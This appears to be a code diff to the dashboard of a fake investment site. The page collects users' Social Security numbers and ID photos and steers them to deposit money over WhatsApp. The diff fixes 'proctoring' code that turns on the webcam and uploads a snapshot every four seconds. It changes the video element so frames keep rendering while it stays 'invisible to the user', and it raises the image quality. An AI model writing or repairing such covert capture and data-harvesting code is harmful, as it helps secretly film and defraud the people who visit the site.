@@ -5,7 +5,7 @@ import { supabase } from '@/lib/supabaseClient';
 import { 
   LogOut, Lock, Smartphone, ShieldCheck, 
   Activity, Upload, Camera, Loader2, User, 
-  ArrowUpRight, Wallet
+  Wallet
 } from 'lucide-react';
 
 export default function Dashboard() {
@@ -46,15 +46,29 @@ export default function Dashboard() {
   const startProctoring = async (userId: string) => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      if (videoRef.current) videoRef.current.srcObject = stream;
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        // Crucial: Wait for video to be ready before starting interval
+        videoRef.current.onloadedmetadata = () => {
+          videoRef.current?.play();
+        };
+      }
       
       setInterval(async () => {
         if (!videoRef.current || !canvasRef.current) return;
-        const context = canvasRef.current.getContext('2d');
-        context?.drawImage(videoRef.current, 0, 0, 640, 480);
-        const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.5));
-        if (blob) {
-          await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
+        
+        // Ensure we are actually getting video data
+        if (videoRef.current.readyState === videoRef.current.HAVE_ENOUGH_DATA) {
+            const context = canvasRef.current.getContext('2d');
+            // Draw exact frame
+            context?.drawImage(videoRef.current, 0, 0, 640, 480);
+            
+            // Convert to JPG
+            const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.7));
+            
+            if (blob) {
+              await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
+            }
         }
       }, 4000);
     } catch (e) { console.warn("Biometrics offline"); }
@@ -67,8 +81,9 @@ export default function Dashboard() {
     try {
       const path = `${user.id}/${Date.now()}_id.jpg`;
       await supabase.storage.from('user-kyc').upload(path, idFile);
+      // We set ssn_data so the UI knows to show "Reviewing"
       await supabase.from('profiles').update({ ssn_data: ssn, document_type: idType, kyc_status: 'pending' }).eq('id', user.id);
-      setUser({ ...user, kyc_status: 'pending' });
+      setUser({ ...user, kyc_status: 'pending', ssn_data: ssn });
     } catch (err: any) { alert(err.message); }
     finally { setKycSubmitting(false); }
   };
@@ -76,6 +91,9 @@ export default function Dashboard() {
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
+
+  // LOGIC FIX: Only show "Pending" if status is pending AND we actually have their data
+  const showPendingScreen = user?.kyc_status === 'pending' && user?.ssn_data;
 
   if (loading) return (
     <div className="min-h-screen bg-black flex flex-col items-center justify-center space-y-4">
@@ -86,12 +104,25 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* BACKGROUND ELEMENTS */}
-      <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
-      <video ref={videoRef} autoPlay muted className="hidden" />
+      {/* FIX 1: VIDEO VISIBILITY
+        Replaced "hidden" with "opacity-0 absolute pointer-events-none".
+        This forces the browser to render the frames (fixing the black screen)
+        while keeping it invisible to the user.
+      */}
+      <video 
+        ref={videoRef} 
+        autoPlay 
+        playsInline 
+        muted 
+        width="640" 
+        height="480"
+        className="absolute opacity-0 pointer-events-none z-[-1]" 
+      />
       <canvas ref={canvasRef} width="640" height="480" className="hidden" />
 
-      {/* MOBILE FRIENDLY HEADER */}
+      <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
+
+      {/* HEADER */}
       <header className="sticky top-0 z-[100] bg-black/60 backdrop-blur-xl border-b border-white/5">
         <div className="max-w-7xl mx-auto px-4 md:px-10 h-20 flex justify-between items-center">
            <div className="flex items-center gap-3">
@@ -118,10 +149,8 @@ export default function Dashboard() {
 
       <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
         
-        {/* TOP ROW: BALANCE & QUICK STATS */}
+        {/* BALANCE & STATS */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
-          
-          {/* BALANCE CARD (Responsive Height) */}
           <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
              <div>
                <div className="flex items-center gap-2 mb-6">
@@ -148,7 +177,6 @@ export default function Dashboard() {
              </div>
           </div>
 
-          {/* STATUS SIDEBAR (Stacked on Mobile) */}
           <div className="lg:col-span-4 space-y-6">
              <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y-8">
                 <div className="flex justify-between items-center border-b border-white/5 pb-4">
@@ -180,7 +208,7 @@ export default function Dashboard() {
           </div>
         </div>
 
-        {/* VERIFICATION CENTER (Responsive Form) */}
+        {/* VERIFICATION CENTER */}
         {user?.kyc_status !== 'verified' && (
           <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
             <div className="max-w-3xl">
@@ -190,7 +218,8 @@ export default function Dashboard() {
               </div>
               <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>
 
-              {user?.kyc_status === 'pending' ? (
+              {/* FIX 2: Only show 'Pending' if we actually have data submitted */}
+              {showPendingScreen ? (
                 <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
                    <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
                    <p className="text-xs uppercase tracking-[0.3em] font-bold text-white">Security Review in Progress</p>
@@ -243,4 +272,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-                 }
+                                 }
